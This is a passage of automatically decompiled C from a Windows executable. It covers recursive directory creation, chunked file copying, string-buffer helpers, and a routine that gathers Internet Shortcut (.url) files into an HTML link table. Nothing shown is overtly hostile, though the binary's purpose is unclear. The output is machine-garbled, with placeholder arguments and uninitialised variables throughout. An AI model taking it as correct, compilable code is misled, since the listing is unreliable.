        *(int32_t *)v6 = 1;
        // 0x404e0e
        return 1;
    }
    int32_t * v9 = (int32_t *)v6; // 0x404dad
    *v9 = v5;
    char v10 = *_mbsinc((char *)&g57); // 0x404db3
    int32_t v11 = v6 - 4;
    int32_t * v12 = (int32_t *)v11;
    int32_t v13 = v5; // 0x404db7
    int32_t v14; // 0x404d43
    char v15; // 0x404db3
    if (v10 != 92) {
        *v9 = v5;
        v14 = (int32_t)_mbsinc((char *)&g57);
        *v12 = v14;
        v15 = *_mbsinc((char *)&g57);
        v13 = v14;
        while (v15 != 92) {
            // 0x404db9
            *v9 = v14;
            v14 = (int32_t)_mbsinc((char *)&g57);
            *v12 = v14;
            v15 = *_mbsinc((char *)&g57);
            v13 = v14;
        }
    }
    char * v16 = (char *)v13; // 0x404dca
    *v16 = 0;
    *v9 = 0;
    *v12 = v4;
    if (!CreateDirectoryA((char *)&g57, (struct _SECURITY_ATTRIBUTES *)&g57)) {
        // 0x404de0
        if (GetLastError() != 183) {
            // 0x404e0e
            return 0;
        }
    }
    int32_t v17 = v6 - 8; // 0x404ded
    *(int32_t *)v17 = v13;
    *v16 = 92;
    int32_t v18 = (int32_t)_mbsinc((char *)&g57); // 0x404df1
    *(int32_t *)(v6 - 12) = v4;
    int32_t len2 = strlen((char *)&g57); // 0x404dff
    while (len2 + v8 >= v18) {
        int32_t v19 = v17;
        v9 = (int32_t *)v19;
        *v9 = v18;
        v10 = *_mbsinc((char *)&g57);
        v11 = v19 - 4;
        v12 = (int32_t *)v11;
        int32_t v20 = v18; // 0x404db7
        v13 = v18;
        if (v10 != 92) {
            *v9 = v20;
            v14 = (int32_t)_mbsinc((char *)&g57);
            *v12 = v14;
            v15 = *_mbsinc((char *)&g57);
            v13 = v14;
            while (v15 != 92) {
                // 0x404db9
                *v9 = v14;
                v14 = (int32_t)_mbsinc((char *)&g57);
                *v12 = v14;
                v15 = *_mbsinc((char *)&g57);
                v13 = v14;
            }
        }
        // 0x404dca
        v16 = (char *)v13;
        *v16 = 0;
        *v9 = 0;
        *v12 = v4;
        if (!CreateDirectoryA((char *)&g57, (struct _SECURITY_ATTRIBUTES *)&g57)) {
            // 0x404de0
            if (GetLastError() != 183) {
                // 0x404e0e
                return 0;
            }
        }
        // 0x404ded
        v17 = v19 - 8;
        *(int32_t *)v17 = v13;
        *v16 = 92;
        v18 = (int32_t)_mbsinc((char *)&g57);
        *(int32_t *)(v19 - 12) = v4;
        len2 = strlen((char *)&g57);
    }
    // 0x404e0b
    *(int32_t *)(v11 - 4) = 1;
    // 0x404e0e
    return 1;
}

// Address range: 0x404e11 - 0x404f2f
int32_t function_404e11(int32_t a1, int32_t a2) {
    int32_t v1 = a1; // bp-1080, 0x404e35
    char * lpFileName = (char *)a1; // 0x404e38
    int32_t * fileHandle = CreateFileA(lpFileName, 0x40000000, 0, NULL, 4, 0x8000000, NULL); // 0x404e38
    int32_t * fileHandle2 = fileHandle; // 0x404e40
    int32_t * v2 = &v1; // 0x404e40
    if (fileHandle == (int32_t *)-1) {
        // 0x404e42
        if (GetLastError() != 5) {
            // 0x404f2a
            return 0;
        }
        char * v3 = _mbsrchr(lpFileName, 92); // 0x404e52
        int32_t v4; // 0x404e11
        if (v3 == NULL) {
            // 0x404e62
            v4 = function_404d43(a1);
        } else {
            // 0x404e72
            *v3 = 0;
            int32_t v5 = function_404d43(a1); // 0x404e65
            *v3 = 92;
            v4 = v5;
        }
        // 0x404e75
        if (v4 == 0) {
            // 0x404f2a
            return 0;
        }
        int32_t v6 = a1; // bp-1108, 0x404e84
        fileHandle2 = CreateFileA(lpFileName, 0x40000000, 0, NULL, 4, 0x8000000, NULL);
        v2 = &v6;
        if (fileHandle2 == (int32_t *)-1) {
            // 0x404f2a
            return 0;
        }
    }
    int32_t v7 = (int32_t)v2;
    *(int32_t *)(v7 - 4) = 0;
    *(int32_t *)(v7 - 8) = 0x8000000;
    *(int32_t *)(v7 - 12) = 3;
    *(int32_t *)(v7 - 16) = 0;
    *(int32_t *)(v7 - 20) = 0;
    *(int32_t *)(v7 - 24) = -0x80000000;
    int32_t v8 = v7 - 28; // 0x404ea3
    *(int32_t *)v8 = a2;
    int32_t * fileHandle3 = CreateFileA((char *)fileHandle2, (int32_t)&g57, (int32_t)&g57, (struct _SECURITY_ATTRIBUTES *)&g57, (int32_t)&g57, (int32_t)&g57, &g57); // 0x404ea6
    int32_t v9; // 0x404e11
    int32_t result; // 0x404e11
    int32_t v10; // 0x404e11
    if (fileHandle3 == (int32_t *)-1) {
        // 0x404e98
        v9 = (int32_t)fileHandle2;
        result = 0;
        v10 = v8;
    } else {
        int32_t v11 = (int32_t)fileHandle3; // 0x404ea6
        *(int32_t *)(v7 - 32) = 2;
        *(int32_t *)(v7 - 36) = 0;
        *(int32_t *)(v7 - 40) = 0;
        int32_t v12 = (int32_t)fileHandle2;
        *(int32_t *)(v7 - 44) = v12;
        SetFilePointer(fileHandle3, (int32_t)&g57, &g57, (int32_t)&g57);
        *(int32_t *)(v7 - 48) = 0;
        int32_t v13; // bp-12, 0x404e11
        int32_t v14 = &v13; // 0x404ec7
        *(int32_t *)(v7 - 52) = v14;
        *(int32_t *)(v7 - 56) = 1024;
        int32_t v15; // bp-1040, 0x404e11
        int32_t v16 = &v15; // 0x404ed4
        *(int32_t *)(v7 - 60) = v16;
        int32_t v17 = v7 - 64; // 0x404ed5
        *(int32_t *)v17 = v11;
        v13 = 0;
        int32_t v18 = 0; // bp-16, 0x404edb
        bool v19 = ReadFile(&g57, &g57, (int32_t)&g57, &g57, (struct _OVERLAPPED *)&g57); // 0x404ede
        int32_t v20 = v7 - 68;
        int32_t * v21 = (int32_t *)v20;
        int32_t v22 = v17; // 0x404ee2
        int32_t v23 = v20; // 0x404ee2
        int32_t * v24 = v21; // 0x404ee2
        if (v19 && v13 != 0) {
            // 0x404ee9
            *v21 = 0;
            *(int32_t *)(v17 - 8) = (int32_t)&v18;
            *(int32_t *)(v17 - 12) = v13;
            *(int32_t *)(v17 - 16) = v16;
            *(int32_t *)(v17 - 20) = v12;
            WriteFile(&g57, &g57, (int32_t)&g57, &g57, (struct _OVERLAPPED *)&g57);
            *(int32_t *)(v17 - 24) = 0;
            *(int32_t *)(v17 - 28) = v14;
            *(int32_t *)(v17 - 32) = 1024;
            *(int32_t *)(v17 - 36) = v16;
            int32_t v25 = v17 - 40; // 0x404f0e
            *(int32_t *)v25 = v11;
            bool v26 = ReadFile(&g57, &g57, (int32_t)&g57, &g57, (struct _OVERLAPPED *)&g57); // 0x404ede
            int32_t v27 = v17 - 44;
            int32_t * v28 = (int32_t *)v27;
            v22 = v25;
            v23 = v27;
            v24 = v28;
            while (v26 && v13 != 0) {
                int32_t v29 = v25;
                *v28 = 0;
                *(int32_t *)(v29 - 8) = (int32_t)&v18;
                *(int32_t *)(v29 - 12) = v13;
                *(int32_t *)(v29 - 16) = v16;
                *(int32_t *)(v29 - 20) = v12;
                WriteFile(&g57, &g57, (int32_t)&g57, &g57, (struct _OVERLAPPED *)&g57);
                *(int32_t *)(v29 - 24) = 0;
                *(int32_t *)(v29 - 28) = v14;
                *(int32_t *)(v29 - 32) = 1024;
                *(int32_t *)(v29 - 36) = v16;
                v25 = v29 - 40;
                *(int32_t *)v25 = v11;
                v26 = ReadFile(&g57, &g57, (int32_t)&g57, &g57, (struct _OVERLAPPED *)&g57);
                v27 = v29 - 44;
                v28 = (int32_t *)v27;
                v22 = v25;
                v23 = v27;
                v24 = v28;
            }
        }
        // 0x404f13
        *v24 = v11;
        CloseHandle(&g57);
        *(int32_t *)(v22 - 8) = 1;
        v9 = v12;
        result = 1;
        v10 = v23;
    }
    // 0x404f1f
    *(int32_t *)(v10 - 4) = v9;
    CloseHandle(&g57);
    // 0x404f2a
    return result;
}

// Address range: 0x404f2f - 0x404f59
int32_t function_404f2f(int32_t a1) {
    // 0x404f2f
    int32_t result; // 0x404f2f
    *(char *)result = *(char *)a1;
    function_4047b7(0);
    function_404f59(a1, 0, -1);
    return result;
}

// Address range: 0x404f59 - 0x405027
int32_t function_404f59(int32_t a1, uint32_t a2, uint32_t a3) {
    int32_t * v1 = (int32_t *)(a1 + 8); // 0x404f67
    uint32_t v2 = *v1; // 0x404f67
    if (v2 < a2) {
        // 0x404f6c
        int32_t v3; // 0x404f59
        int32_t v4; // 0x404f59
        int32_t v5; // 0x404f59
        function_404a40(v3, v4, v5);
        // UNREACHABLE
    }
    uint32_t v6 = v2 - a2; // 0x404f79
    int32_t v7 = v6 <= a3 ? v6 : a3;
    int32_t result; // 0x404f59
    if (result == a1) {
        // 0x404f87
        function_40505c(v7 + a2, -1);
        function_40505c(0, a2);
        // 0x40501e
        return result;
    }
    if (v7 != 0 && v7 == v2) {
        int32_t * v8 = (int32_t *)(a1 + 4); // 0x404fad
        int32_t v9 = *v8; // 0x404fad
        char * v10 = v9 != 0 ? (char *)(v9 - 1) : (char *)((int32_t)&g2 - 1); // 0x404fb9
        if (*v10 < 254) {
            // 0x404fbf
            function_4047b7(1);
            int32_t v11 = *v8; // 0x404fc8
            int32_t v12 = v11 != 0 ? v11 : (int32_t)&g2;
            *(int32_t *)(result + 4) = v12;
            *(int32_t *)(result + 8) = *v1;
            *(int32_t *)(result + 12) = *(int32_t *)(a1 + 12);
            char * v13 = (char *)(v12 - 1); // 0x404fe3
            *v13 = *v13 + 1;
            // 0x40501e
            return result;
        }
    }
    // 0x404fe8
    if ((char)function_4050c3(v7, 1) != 0) {
        int32_t v14 = *(int32_t *)(a1 + 4); // 0x404ff6
        int32_t v15 = v14 != 0 ? v14 : (int32_t)&g2;
        int32_t * v16 = (int32_t *)(result + 4); // 0x405009
        memcpy((int32_t *)*v16, (int32_t *)(v15 + a2), v7);
        *(int32_t *)(result + 8) = v7;
        *(char *)(*v16 + v7) = 0;
    }
    // 0x40501e
    return result;
}

// Address range: 0x405027 - 0x40505c
int32_t function_405027(int32_t a1) {
    // 0x405027
    int32_t result; // 0x405027
    if ((char)function_4050c3(a1, 1) != 0) {
        int32_t * v1 = (int32_t *)(result + 4); // 0x405040
        int32_t v2; // 0x405027
        memcpy((int32_t *)*v1, (int32_t *)v2, a1);
        *(int32_t *)(result + 8) = a1;
        *(char *)(*v1 + a1) = 0;
    }
    // 0x405055
    return result;
}

// Address range: 0x40505c - 0x4050c3
int32_t function_40505c(uint32_t a1, uint32_t a2) {
    // 0x40505c
    int32_t result; // 0x40505c
    int32_t * v1 = (int32_t *)(result + 8); // 0x405065
    int32_t v2; // 0x40505c
    int32_t v3; // 0x40505c
    int32_t v4; // 0x40505c
    if (*v1 < a1) {
        // 0x40506a
        function_404a40(v2, v3, v4);
        // UNREACHABLE
    }
    // 0x40506f
    function_405205(v2, v3, v4);
    uint32_t v5 = *v1 - a1; // 0x40507d
    int32_t v6 = v5 >= a2 ? a2 : v5;
    if (v6 == 0) {
        // 0x4050bb
        return result;
    }
    int32_t * v7 = (int32_t *)(result + 4); // 0x405089
    int32_t v8 = *v7 + a1; // 0x40508e
    memmove((int32_t *)v8, (int32_t *)(v8 + v6), v5 - v6);
    int32_t v9 = *v1 - v6; // 0x4050a1
    if ((char)function_4050c3(v9, 0) != 0) {
        // 0x4050b1
        *v1 = v9;
        *(char *)(*v7 + v9) = 0;
    }
    // 0x4050bb
    return result;
}

// Address range: 0x4050c3 - 0x405148
int32_t function_4050c3(uint32_t a1, int32_t a2) {
    // 0x4050c3
    int32_t v1; // 0x4050c3
    if (a1 >= 0xfffffffe) {
        // 0x4050d0
        int32_t v2; // 0x4050c3
        function_404814(v2, v1);
        // UNREACHABLE
    }
    // 0x4050d5
    int32_t v3; // bp-8, 0x4050c3
    int32_t v4 = &v3; // 0x4050c4
    int32_t v5; // 0x4050c3
    int32_t v6 = *(int32_t *)(v5 + 4); // 0x4050d5
    int32_t v7; // 0x4050c3
    int32_t v8; // 0x4050c3
    int32_t v9; // 0x4050c3
    int32_t v10; // bp-12, 0x4050c3
    if (v6 == 0) {
        goto lab_0x4050fe;
    } else {
        char * v11 = (char *)(v6 - 1); // 0x4050de
        char v12 = *v11; // 0x4050de
        int32_t v13; // 0x4050c3
        v8 = v13 & -256;
        switch (v12) {
            case 0: {
                goto lab_0x4050fe;
            }
            case -1: {
                goto lab_0x4050fe;
            }
            default: {
                // 0x4050e9
                v9 = v4;
                if (a1 != 0) {
                    goto lab_0x405139;
                } else {
                    // 0x4050ed
                    v10 = 0;
                    *v11 = v12 - 1;
                    v7 = v10;
                    return function_4047b7(v7) & -256;
                }
            }
        }
    }
  lab_0x4050fe:
    // 0x4050fe
    if (a1 != 0) {
        uint32_t v14 = *(int32_t *)(v5 + 12);
        if ((char)a2 == 0) {
            // 0x405134
            v9 = v4;
            if (v14 >= a1) {
                // 0x405143
                return v8 & -256 | 1;
            }
        } else {
            // 0x40511d
            if (v14 < 32 == v14 >= a1) {
                // 0x405143
                return v14 & -256 | 1;
            }
            // 0x405129
            v10 = 1;
            function_4047b7(1);
            v9 = &v10;
        }
        goto lab_0x405139;
    } else {
        if ((char)a2 == 0) {
            // 0x40510c
            if (v6 != 0) {
                // 0x405110
                *(int32_t *)(v5 + 8) = 0;
                *(char *)v6 = 0;
            }
            // 0x405143
            return v8 & -256;
        }
        // 0x405108
        v10 = 1;
        v7 = 1;
        return function_4047b7(v7) & -256;
    }
  lab_0x405139:
    // 0x405139
    *(int32_t *)(v9 - 4) = a1;
    // 0x405143
    return function_405148(v3, v1) & -256 | 1;
    // 0x405143
    return function_4047b7(v7) & -256;
}

// Address range: 0x405148 - 0x405187
int32_t function_405148(int32_t a1, int32_t a2) {
    // 0x405148
    function_408520((int32_t)&g57);
    int32_t v1; // 0x405148
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x405158
    int32_t v3 = *v2 | 31; // 0x40515b
    int32_t v4; // bp-24, 0x405148
    *(int32_t *)(v1 - 16) = (int32_t)&v4;
    int32_t v5 = v3; // 0x405169
    if (v3 >= 0xfffffffd) {
        // 0x40516b
        v5 = *v2;
    }
    // 0x40516e
    *(int32_t *)(v1 - 4) = 0;
    int32_t v6 = v5 + 2; // 0x405172
    *v2 = _3f__3f_2_40_YAPAXI_40_Z(v6 >= 0 ? v6 : 0);
    return function_4051ac((int32_t)&g57, (int32_t)&g57);
}

// Address range: 0x405187 - 0x4051a6
int32_t function_405187(void) {
    // 0x405187
    int32_t v1; // 0x405187
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x405187
    int32_t v3 = *v2; // 0x405187
    *(int32_t *)(v1 - 24) = v3;
    int32_t v4 = v3 + 2; // 0x40518d
    *v2 = _3f__3f_2_40_YAPAXI_40_Z(v4 >= 0 ? v4 : 0);
    return 0x4051a6;
}

// Address range: 0x4051ac - 0x405205
int32_t function_4051ac(int32_t a1, int32_t a2) {
    // 0x4051ac
    int32_t v1; // 0x4051ac
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x4051ac
    uint32_t v3 = *v2; // 0x4051ac
    int32_t * v4; // 0x4051ac
    int32_t * v5; // 0x4051ac
    int32_t v6; // 0x4051ac
    uint32_t v7; // 0x4051ac
    int32_t v8; // 0x4051ac
    if (v3 == 0) {
        // 0x4051ac
        v5 = (int32_t *)(v1 + 4);
        v4 = (int32_t *)(v8 + 8);
        v6 = 0;
    } else {
        int32_t * v9 = (int32_t *)(v8 + 8);
        int32_t * v10 = (int32_t *)(v1 + 4);
        memcpy((int32_t *)(*v9 + 1), (int32_t *)*v10, v3 > v7 ? v7 : v3);
        v5 = v10;
        v4 = v9;
        v6 = *v2;
    }
    uint32_t v11 = v6; // 0x4051ca
    function_4047b7(1);
    int32_t v12 = *v4; // 0x4051d6
    *v5 = v12 + 1;
    *(char *)v12 = 0;
    int32_t v13 = v11 > v7 ? v7 : v11;
    int32_t result = *v5; // 0x4051ea
    *v2 = v13;
    *(char *)(result + v13) = 0;
    __writefsdword(0, *(int32_t *)(v8 - 12));
    return result;
}

// Address range: 0x405205 - 0x405235
int32_t function_405205(int32_t a1, int32_t a2, int32_t a3) {
    // 0x405205
    int32_t v1; // 0x405205
    int32_t str = *(int32_t *)(v1 + 4); // 0x405209
    int32_t result; // 0x405205
    if (str == 0) {
        // 0x405232
        return result;
    }
    unsigned char v2 = *(char *)(str - 1); // 0x405210
    int32_t v3; // 0x405205
    result = v3 & -256 | (int32_t)v2;
    switch (v2) {
        default: {
            // 0x40521b
            function_4047b7(1);
            strlen((char *)str);
            result = function_405027(str);
        }
        case 0: {
        }
        case -1: {
            // 0x405232
            return result;
        }
    }
}

// Address range: 0x405235 - 0x4052be
int32_t function_405235(void) {
    // 0x405235
    function_408520((int32_t)&g57);
    int32_t v1; // 0x405235
    int32_t v2 = *(int32_t *)(v1 + 12); // 0x405244
    *(int32_t *)(v1 - 16) = 0;
    *(char *)(v1 - 32) = *(char *)v2;
    function_4047b7(0);
    function_404f59(v2, 0, -1);
    int32_t * str = (int32_t *)(v1 + 16); // 0x40526b
    *(int32_t *)(v1 - 4) = 0;
    strlen((char *)*str);
    int32_t v3 = function_4053c6(*str); // 0x40527e
    int32_t result = *(int32_t *)(v1 + 8); // 0x405283
    *(char *)result = *(char *)v3;
    function_4047b7(0);
    function_404f59(v3, 0, -1);
    function_4047b7(1);
    __writefsdword(0, *(int32_t *)(v1 - 12));
    return result;
}

// Address range: 0x4052be - 0x405340
int32_t function_4052be(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4052be
    function_408520((int32_t)&g57);
    int32_t v1; // 0x4052be
    int32_t v2 = *(int32_t *)(v1 + 12); // 0x4052ce
    *(int32_t *)(v1 - 16) = 0;
    *(char *)(v1 - 32) = *(char *)v2;
    function_4047b7(0);
    function_404f59(v2, 0, -1);
    *(int32_t *)(v1 - 4) = 0;
    int32_t v3 = function_405340(*(int32_t *)(v1 + 16), 0, -1); // 0x405300
    int32_t result = *(int32_t *)(v1 + 8); // 0x405305
    *(char *)result = *(char *)v3;
    function_4047b7(0);
    function_404f59(v3, 0, -1);
    function_4047b7(1);
    __writefsdword(0, *(int32_t *)(v1 - 12));
    return result;
}

// Address range: 0x405340 - 0x4053c6
int32_t function_405340(int32_t a1, uint32_t a2, uint32_t a3) {
    uint32_t v1 = *(int32_t *)(a1 + 8); // 0x40534e
    int32_t v2; // 0x405340
    int32_t v3; // 0x405340
    if (v1 < a2) {
        // 0x405353
        int32_t v4; // 0x405340
        function_404a40(v2, v3, v4);
        // UNREACHABLE
    }
    uint32_t v5 = v1 - a2; // 0x40535b
    uint32_t v6 = v5 >= a3 ? a3 : v5;
    int32_t result; // 0x405340
    int32_t * v7 = (int32_t *)(result + 8); // 0x405368
    int32_t v8 = *v7; // 0x405368
    if (v6 >= -1 - v8) {
        // 0x405370
        function_404814(v2, v3);
        // UNREACHABLE
    }
    if (v6 == 0) {
        // 0x4053bd
        return result;
    }
    int32_t v9 = v8 + v6; // 0x405380
    if ((char)function_4050c3(v9, 0) != 0) {
        int32_t v10 = *(int32_t *)(a1 + 4); // 0x40538f
        int32_t v11 = v10 != 0 ? v10 : (int32_t)&g2;
        int32_t * v12 = (int32_t *)(result + 4); // 0x4053a4
        memcpy((int32_t *)(*v7 + *v12), (int32_t *)(v11 + a2), v6);
        *v7 = v9;
        *(char *)(*v12 + v9) = 0;
    }
    // 0x4053bd
    return result;
}

// Address range: 0x4053c6 - 0x40541b
int32_t function_4053c6(uint32_t a1) {
    // 0x4053c6
    int32_t result; // 0x4053c6
    int32_t * v1 = (int32_t *)(result + 8); // 0x4053d2
    int32_t v2 = *v1; // 0x4053d2
    if (-1 - v2 <= a1) {
        // 0x4053d9
        int32_t v3; // 0x4053c6
        int32_t v4; // 0x4053c6
        function_404814(v3, v4);
        // UNREACHABLE
    }
    if (a1 == 0) {
        // 0x405413
        return result;
    }
    int32_t v5 = v2 + a1; // 0x4053e6
    if ((char)function_4050c3(v5, 0) != 0) {
        int32_t * v6 = (int32_t *)(result + 4); // 0x4053fd
        int32_t v7; // 0x4053c6
        memcpy((int32_t *)(*v6 + *v1), (int32_t *)v7, a1);
        *v1 = v5;
        *(char *)(*v6 + v5) = 0;
    }
    // 0x405413
    return result;
}

// Address range: 0x40541b - 0x40543c
int32_t function_40541b(void) {
    // 0x40541b
    if ((g53 & 1) == 0) {
        // 0x405424
        g53 |= 1;
    }
    // 0x405430
    return function_408584(0x4078aa);
}

// Address range: 0x40543c - 0x405449
int32_t function_40543c(void) {
    // 0x40543c
    int32_t result; // 0x40543c
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)result = (int32_t)&g6;
    return result;
}

// Address range: 0x405465 - 0x40546c
// Demangled:     protected: virtual __thiscall std::_Mpunct<char>::~_Mpunct<char>(void)
int32_t ??1?$_Mpunct@D@std@@MAE@XZ4(void) {
    // 0x405465
    int32_t v1; // 0x405465
    *(int32_t *)v1 = (int32_t)&g6;
    int32_t result; // 0x405465
    return result;
}

// Address range: 0x40546c - 0x40568c
int32_t function_40546c(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40546c
    int32_t v1; // 0x40546c
    function_4085f0(v1);
    int32_t str; // bp-1108, 0x40546c
    char * v2 = (char *)&str; // bp-24, 0x40549a
    sprintf((char *)&str, a3 != 0 ? "%s\\*.url" : "%s\\*.*");
    char lpFindFileData; // bp-328, 0x40546c
    int32_t * v3 = FindFirstFileA((char *)&str, (struct _WIN32_FIND_DATAA *)&lpFindFileData); // 0x4054b1
    if (v3 == (int32_t *)-1) {
        int32_t result = 0; // 0x4054c2
        if (a3 != 0) {
            // 0x4054c4
            v2 = NULL;
            result = function_40546c(a1, a2, 0);
        }
        // 0x405686
        return result;
    }
    int32_t v4 = (int32_t)v3; // 0x4054b1
    int32_t v5; // 0x40546c
    v2 = (char *)v5;
    char v6; // bp-284, 0x40546c
    int32_t v7 = &v6; // 0x4054e7
    int32_t v8; // bp-588, 0x40546c
    int32_t v9 = &v8;
    int32_t v10; // bp-3156, 0x40546c
    int32_t v11 = &v10;
    int32_t v12; // bp-848, 0x40546c
    int32_t v13 = &v12;
    int32_t v14; // bp-5724, 0x40546c
    int32_t v15 = &v14;
    int32_t v16 = 1;
    int32_t v17 = (int32_t)&v2;
    int32_t * v18 = (int32_t *)(v17 - 4); // 0x4054e7
    *v18 = v7;
    int32_t len = strlen((char *)&g57); // 0x4054e8
    int32_t v19 = v17; // 0x4054f0
    int32_t v20 = v16; // 0x4054f0
    int32_t * v21; // 0x40546c
    int32_t v22; // 0x405591
    int32_t * v23; // 0x40546c
    int32_t * v24; // 0x40546c
    int32_t v25; // 0x40546c
    int32_t v26; // 0x40546c
    int32_t v27; // bp-4, 0x40546c
    int32_t * v28; // 0x40550a
    int32_t v29; // 0x405511
    int32_t * v30; // 0x405511
    int32_t * v31; // 0x405516
    int32_t v32; // 0x40556c
    int32_t v33; // 0x40546c
    int32_t * v34; // 0x40546c
    int32_t v35; // 0x40559f
    int32_t * v36; // 0x4055a7
    int32_t * v37; // 0x4055a8
    int32_t * v38; // 0x4055af
    char * v39; // 0x4055c7
    if (len != 0 && v6 != 46) {
        // 0x405503
        *v18 = v7;
        v28 = (int32_t *)(v17 - 8);
        *v28 = a2;
        v29 = v17 - 12;
        v30 = (int32_t *)v29;
        *v30 = (int32_t)"%s\\%s";
        v31 = (int32_t *)(v17 - 16);
        *v31 = v9;
        sprintf((char *)&g57, (char *)&g57);
        if (a3 != 0) {
            // 0x40554a
            *v18 = v9;
            *v28 = 2048;
            *v30 = v11;
            *v31 = (int32_t)&g29;
            *(int32_t *)(v17 - 20) = (int32_t)"URL";
            *(int32_t *)(v17 - 24) = (int32_t)"InternetShortcut";
            v32 = GetPrivateProfileStringA((char *)&g57, (char *)&g57, (char *)&g57, (char *)&g57, (int32_t)&g57, (char *)&g57);
            v21 = (int32_t *)(v17 - 28);
            if (v32 != 0) {
                // 0x40554a
                v22 = v17 - 32;
                v23 = (int32_t *)v22;
                v25 = v22;
            } else {
                // 0x405576
                *v21 = (int32_t)"<unknown>";
                v33 = v17 - 32;
                v34 = (int32_t *)v33;
                *v34 = v11;
                strcpy((char *)&g57, (char *)&g57);
                v23 = v34;
                v25 = v33;
            }
            // 0x405589
            v24 = v23;
            *v21 = 46;
            *v24 = v7;
            v35 = (int32_t)_mbsrchr((char *)&g57, (int32_t)&g57) - v7;
            v36 = (int32_t *)(v17 - 36);
            *v36 = v35;
            v37 = (int32_t *)(v17 - 40);
            *v37 = v7;
            v38 = (int32_t *)(v17 - 44);
            *v38 = v9;
            memcpy(&g57, &g57, (int32_t)&g57);
            *(char *)((int32_t)&v27 - 584 + v35) = 0;
            if (v16 == 0) {
                // 0x405619
                *v21 = v9;
                *v24 = v11;
                *v36 = (int32_t)"<tr><td>&nbsp;</td><td><a href='%s'>%s</a></td></tr>";
                *v37 = v15;
                sprintf((char *)&g57, (char *)&g57);
            } else {
                // 0x4055c4
                *v21 = 92;
                *v24 = a2;
                v39 = _mbsrchr((char *)&g57, (int32_t)&g57);
                v26 = a2;
                if (v39 != NULL) {
                    // 0x4055d6
                    *v21 = (int32_t)v39;
                    v26 = (int32_t)_mbsinc((char *)&g57);
                }
                // 0x4055dd
                *v21 = v26;
                *v24 = v13;
                strcpy((char *)&g57, (char *)&g57);
                *v21 = v9;
                *v24 = v11;
                *v36 = v13;
                *v37 = (int32_t)"<tr><td>&nbsp;</td><td>&nbsp;</td></tr><tr><td><b>%s</b></td><td><a href='%s'>%s</a></td></tr>";
                *v38 = v15;
                sprintf((char *)&g57, (char *)&g57);
            }
            // 0x40563b
            *v21 = v15;
            *v24 = a1;
            function_405863((int32_t)&g57, (int32_t)&g57);
            v19 = v25;
            v20 = 0;
        } else {
            // 0x405524
            v19 = v17;
            v20 = v16;
            if ((lpFindFileData & 16) != 0) {
                // 0x405531
                *v18 = 1;
                *v28 = v9;
                *v30 = a1;
                function_40546c((int32_t)&g57, (int32_t)&g57, (int32_t)&g57);
                v19 = v29;
                v20 = v16;
            }
        }
    }
    int32_t v40 = v19;
    *(int32_t *)(v40 - 4) = (int32_t)&lpFindFileData;
    int32_t v41 = v40 - 8; // 0x405656
    *(int32_t *)v41 = v4;
    while (FindNextFileA(&g57, (struct _WIN32_FIND_DATAA *)&g57)) {
        // 0x4054e1
        v16 = v20;
        v17 = v41;
        v18 = (int32_t *)(v17 - 4);
        *v18 = v7;
        len = strlen((char *)&g57);
        v19 = v17;
        v20 = v16;
        if (len != 0 && v6 != 46) {
            // 0x405503
            *v18 = v7;
            v28 = (int32_t *)(v17 - 8);
            *v28 = a2;
            v29 = v17 - 12;
            v30 = (int32_t *)v29;
            *v30 = (int32_t)"%s\\%s";
            v31 = (int32_t *)(v17 - 16);
            *v31 = v9;
            sprintf((char *)&g57, (char *)&g57);
            if (a3 != 0) {
                // 0x40554a
                *v18 = v9;
                *v28 = 2048;
                *v30 = v11;
                *v31 = (int32_t)&g29;
                *(int32_t *)(v17 - 20) = (int32_t)"URL";
                *(int32_t *)(v17 - 24) = (int32_t)"InternetShortcut";
                v32 = GetPrivateProfileStringA((char *)&g57, (char *)&g57, (char *)&g57, (char *)&g57, (int32_t)&g57, (char *)&g57);
                v21 = (int32_t *)(v17 - 28);
                if (v32 != 0) {
                    // 0x40554a
                    v22 = v17 - 32;
                    v23 = (int32_t *)v22;
                    v25 = v22;
                } else {
                    // 0x405576
                    *v21 = (int32_t)"<unknown>";
                    v33 = v17 - 32;
                    v34 = (int32_t *)v33;
                    *v34 = v11;
                    strcpy((char *)&g57, (char *)&g57);
                    v23 = v34;
                    v25 = v33;
                }
                // 0x405589
                v24 = v23;
                *v21 = 46;
                *v24 = v7;
                v35 = (int32_t)_mbsrchr((char *)&g57, (int32_t)&g57) - v7;
                v36 = (int32_t *)(v17 - 36);
                *v36 = v35;
                v37 = (int32_t *)(v17 - 40);
                *v37 = v7;
                v38 = (int32_t *)(v17 - 44);
                *v38 = v9;
                memcpy(&g57, &g57, (int32_t)&g57);
                *(char *)((int32_t)&v27 - 584 + v35) = 0;
                if (v16 == 0) {
                    // 0x405619
                    *v21 = v9;
                    *v24 = v11;
                    *v36 = (int32_t)"<tr><td>&nbsp;</td><td><a href='%s'>%s</a></td></tr>";
                    *v37 = v15;
                    sprintf((char *)&g57, (char *)&g57);
                } else {
                    // 0x4055c4
                    *v21 = 92;
                    *v24 = a2;
                    v39 = _mbsrchr((char *)&g57, (int32_t)&g57);
                    v26 = a2;
                    if (v39 != NULL) {
                        // 0x4055d6
                        *v21 = (int32_t)v39;
                        v26 = (int32_t)_mbsinc((char *)&g57);
                    }
                    // 0x4055dd
                    *v21 = v26;
                    *v24 = v13;
                    strcpy((char *)&g57, (char *)&g57);
                    *v21 = v9;
                    *v24 = v11;
                    *v36 = v13;
                    *v37 = (int32_t)"<tr><td>&nbsp;</td><td>&nbsp;</td></tr><tr><td><b>%s</b></td><td><a href='%s'>%s</a></td></tr>";
                    *v38 = v15;
                    sprintf((char *)&g57, (char *)&g57);
                }
                // 0x40563b
                *v21 = v15;
                *v24 = a1;
                function_405863((int32_t)&g57, (int32_t)&g57);
                v19 = v25;
                v20 = 0;
            } else {
                // 0x405524
                v19 = v17;
                v20 = v16;
                if ((lpFindFileData & 16) != 0) {
                    // 0x405531
                    *v18 = 1;
                    *v28 = v9;
                    *v30 = a1;
                    function_40546c((int32_t)&g57, (int32_t)&g57, (int32_t)&g57);
                    v19 = v29;
                    v20 = v16;
                }
            }
        }
        // 0x40564f
        v40 = v19;
        *(int32_t *)(v40 - 4) = (int32_t)&lpFindFileData;
        v41 = v40 - 8;
        *(int32_t *)v41 = v4;
    }
    int32_t * v42 = (int32_t *)(v40 - 12); // 0x405667
    *v42 = v4;
    FindClose(&g57);
    int32_t v43 = v41; // 0x405674
    if (a3 != 0) {
        // 0x405676
